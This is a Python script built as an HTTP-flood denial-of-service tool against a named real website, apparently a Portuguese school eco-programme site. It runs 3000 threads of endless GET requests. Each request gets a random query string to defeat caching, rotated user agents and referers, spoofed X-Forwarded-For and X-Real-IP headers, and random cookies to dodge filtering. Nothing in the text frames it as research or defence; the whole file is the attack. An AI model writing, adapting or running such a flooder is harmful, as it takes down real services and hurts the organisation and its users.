import threading
import requests
import random
import string
import time
from urllib.parse import urlencode
import urllib.parse

target_url = "https://ecoescolas.abaae.pt/"

with open('useragents.txt', 'r') as file:
    user_agents = [line.strip() for line in file.readlines()]

with open('referers.txt', 'r') as file:
    referers = [line.strip() for line in file.readlines()]

def generate_query_string():
    length = random.randint(6, 27)
    return "?" + "&".join(f"{random.choice(string.ascii_letters)}={random.randint(1, 10000)}" for _ in range(length))

def generate_ip():
    blocks = [random.randint(0, 255) for _ in range(4)]
    return ".".join(str(block) for block in blocks)

def generate_custom_headers():
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept-Language": random.choice(["en-US,en;q=0.5", "fr-fr;q=0.8", "es-es;q=0.7"]),
        "Connection": "keep-alive",
        "Cache-Control": "no-cache, max-age=0",
        "Accept": random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "application/json, text/javascript, */*; q=0.01"]),
        "Referer": random.choice(referers),
        "Accept-Encoding": "gzip, deflate",
        "Pragma": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "X-Forwarded-For": generate_ip(),
        "X-Forwarded-Proto": "http",
        "X-Real-IP": generate_ip(),
        "X-Frame-Options": "deny",
        "X-Content-Type-Options": "nosniff",
        "X-XSS-Protection": "1; mode=block",
        "DNT": "1",
        "If-None-Match": 'W/"cb85038b0d4e19"',
        "If-Modified-Since": "Thu, 01 Jan 1970 00:00:00 GMT",
        "Cookie": "".join(random.choices(string.ascii_letters + string.digits, k=20))
    }
    return headers

def flood():
    while True:
        custom_headers = generate_custom_headers()
        unique_url = target_url + generate_query_string()
        try:
            response = requests.get(unique_url, headers=custom_headers)
            print(f"GET request sent to {unique_url} from spoofed IP {custom_headers['X-Real-IP']}. Response status code: {response.status_code}")
            time.sleep(random.uniform(0.1, 3))
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

num_threads = 3000

threads = []
for _ in range(num_threads):
    t = threading.Thread(target=flood)
    t.daemon = True
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()